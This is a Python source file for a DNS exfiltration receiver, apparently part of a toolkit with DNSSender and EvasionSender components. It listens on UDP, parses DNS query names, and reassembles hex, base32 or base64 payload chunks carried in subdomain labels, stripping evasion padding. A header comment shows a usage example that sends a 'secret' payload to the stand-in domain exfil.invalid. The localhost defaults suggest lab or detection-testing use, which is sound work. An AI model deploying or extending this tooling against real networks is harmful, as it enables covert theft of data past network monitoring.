# DNS receiver — passive payload reconstructor.
# Listens on a UDP socket and reassembles exfiltrated data from sequence-numbered
# DNS subdomain queries produced by DNSSender or EvasionSender.
#
# To use with the sender:
#   Terminal 1: python -m cli.main receive
#   Terminal 2: python -m cli.main send --payload "secret" --server 127.0.0.1 --domain exfil.invalid
#
# The sender's --server must point to the receiver's host and port.
# The receiver does not send DNS responses — it is a passive reconstructor only.
# Senders that require a response will time out, which is expected behaviour.

from __future__ import annotations

import logging
import re
import signal
import socket
import struct
import threading
from dataclasses import dataclass, field
from pathlib import Path

logger = logging.getLogger(__name__)


@dataclass
class ChunkBuffer:
    """Accumulates sequenced encoded chunks for a single exfiltration session.

    Attributes:
        domain: The base domain for this session (e.g. 'exfil.invalid').
        src_ip: Source IP of the sender.
        encoding: Payload encoding inferred from the first chunk's wire tag.
        chunks: Mapping of sequence number to encoded chunk string.
        complete: True once a 'done' terminator has been received.
    """

    domain: str
    src_ip: str
    encoding: str = "hex"
    chunks: dict[int, str] = field(default_factory=dict)
    complete: bool = False

    def add_chunk(self, seq: int, chunk: str) -> None:
        """Store an encoded chunk at the given sequence position.

        Args:
            seq: Sequence number parsed from the subdomain label prefix.
            chunk: Encoded payload fragment from the subdomain label.
        """
        self.chunks[seq] = chunk

    def reconstruct(self) -> bytes:
        """Reassemble chunks in sequence order and decode to bytes.

        Characters outside the encoding's alphabet are stripped to handle
        EvasionSender padding. Returns empty bytes if no chunks have been stored.

        Returns:
            Reconstructed payload as bytes, or b'' on decode failure.
        """
        if not self.chunks:
            return b""
        ordered = [self.chunks[k] for k in sorted(self.chunks.keys())]
        if self.encoding == "hex":
            clean = lambda s: re.sub(r"[^0-9a-fA-F]", "", s)
        elif self.encoding == "base32":
            clean = lambda s: re.sub(r"[^a-z2-7]", "", s)
        else:  # base64
            clean = lambda s: re.sub(r"[^A-Za-z0-9\-_]", "", s)
        cleaned = "".join(clean(chunk) for chunk in ordered)
        try:
            import base64 as _b64

            if self.encoding == "hex":
                return bytes.fromhex(cleaned)
            if self.encoding == "base32":
                upper = cleaned.upper()
                pad = (8 - len(upper) % 8) % 8
                return _b64.b32decode(upper + "=" * pad)
            pad = (4 - len(cleaned) % 4) % 4
            return _b64.urlsafe_b64decode(cleaned + "=" * pad)
        except Exception as exc:
            logger.error("reconstruct: decode failed (encoding=%s): %s", self.encoding, exc)
            return b""


class DNSReceiver:
    """Minimal UDP server that reconstructs exfiltrated payloads from DNS subdomain queries.

    Listens on a UDP socket. For each incoming packet, the DNS wire-format query
    name is extracted and parsed. Labels matching ``SEQ_encodingTag_chunk``
    (encoding tag ``h``, ``b32``, or ``b64``) are stored in a per-session
    ``ChunkBuffer``. On receiving a ``done.DOMAIN``
    terminator, the buffer is reconstructed and the ``on_complete`` callback is
    invoked.

    Sessions are keyed by ``(src_ip, base_domain)``, so concurrent sessions from
    different sources or targeting different domains are handled independently.

    Args:
        host: IP address to bind to. Default ``'127.0.0.1'``.
        port: UDP port to listen on. Default ``5353``.
        on_complete: Called with ``(src_ip, domain, payload_bytes)`` when a
            session terminates. If ``None``, the default handler logs and prints
            a summary to stdout.
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 5353,
        on_complete=None,
    ) -> None:
        self.host = host
        self.port = port
        self.on_complete = on_complete or self._default_on_complete
        self._sessions: dict[tuple[str, str], ChunkBuffer] = {}
        self._sock: socket.socket | None = None
        self._running = False

    @staticmethod
    def _default_on_complete(src_ip: str, domain: str, payload: bytes) -> None:
        """Log and print a summary of a completed exfiltration session.

        Args:
            src_ip: Source IP address of the sender.
            domain: Base domain the session was targeting.
            payload: Reconstructed payload bytes.
        """
        logger.info(
            "session complete: src=%s domain=%s bytes=%d payload_preview=%r",
            src_ip, domain, len(payload), payload[:80],
        )
        print(f"\n[+] Session complete from {src_ip} targeting {domain}")
        print(f"    Bytes received: {len(payload)}")
        print(f"    Preview: {payload[:80]!r}")

    def _parse_dns_query_name(self, data: bytes, offset: int) -> str:
        """Parse a DNS wire-format query name starting at the given byte offset.

        Args:
            data: Raw UDP payload bytes.
            offset: Byte offset where the QNAME field starts (immediately after
                the 12-byte DNS header).

        Returns:
            Dot-separated domain name string, or ``""`` on parse error.
        """
        labels = []
        visited: set[int] = set()
        try:
            while True:
                if offset in visited:
                    break
                visited.add(offset)
                length = data[offset]
                if length == 0:
                    break
                if (length & 0xC0) == 0xC0:
                    if offset + 1 >= len(data):
                        break
                    ptr = ((length & 0x3F) << 8) | data[offset + 1]
                    offset = ptr
                    continue
                offset += 1
                labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
                offset += length
        except (IndexError, UnicodeDecodeError):
            return ""
        return ".".join(labels)

    def _handle_packet(self, data: bytes, addr: tuple[str, int]) -> None:
        """Process a single incoming DNS UDP packet.

        Extracts the queried name from the DNS wire format, identifies the
        subdomain label and base domain, and routes to chunk storage or
        session completion.

        Args:
            data: Raw UDP payload bytes.
            addr: ``(src_ip, src_port)`` of the sending socket.
        """
        src_ip = addr[0]
        if len(data) < 12:
            return

        qname = self._parse_dns_query_name(data, offset=12)
        if not qname:
            return

        parts = qname.split(".")
        if len(parts) < 2:
            return

        label = parts[0]
        base_domain = ".".join(parts[1:])
        session_key = (src_ip, base_domain)

        if label == "done":
            session = self._sessions.get(session_key)
            if session:
                session.complete = True
                payload = session.reconstruct()
                self.on_complete(src_ip, base_domain, payload)
                del self._sessions[session_key]
            return

        label_parts = label.split("_", 2)
        if len(label_parts) < 3:
            return
        seq_str, encoding_tag, payload_chunk = label_parts
        if not seq_str.isdigit():
            return
        _tag_to_encoding = {"h": "hex", "b32": "base32", "b64": "base64"}
        if encoding_tag not in _tag_to_encoding:
            return
        seq = int(seq_str)
        inferred_encoding = _tag_to_encoding[encoding_tag]

        if session_key not in self._sessions:
            self._sessions[session_key] = ChunkBuffer(
                domain=base_domain, src_ip=src_ip, encoding=inferred_encoding
            )
        self._sessions[session_key].add_chunk(seq, payload_chunk)
        logger.debug("received chunk seq=%d domain=%s src=%s", seq, base_domain, src_ip)

    def start(self) -> None:
        """Bind the UDP socket and receive packets until stop() is called.

        Blocks the calling thread. Run in a background thread if non-blocking
        operation is needed. The socket uses a 1-second timeout so that
        stop() takes effect within one polling cycle.
        """
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.host, self.port))
        self._running = True
        print(f"[*] DNS receiver listening on {self.host}:{self.port}")
        logger.info("receiver started on %s:%d", self.host, self.port)
        try:
            while self._running:
                self._sock.settimeout(1.0)
                try:
                    data, addr = self._sock.recvfrom(4096)
                    self._handle_packet(data, addr)
                except socket.timeout:
                    continue
        finally:
            self._sock.close()
            logger.info("receiver stopped")

    def stop(self) -> None:
        """Signal the receive loop to exit after the current 1-second timeout."""
        self._running = False
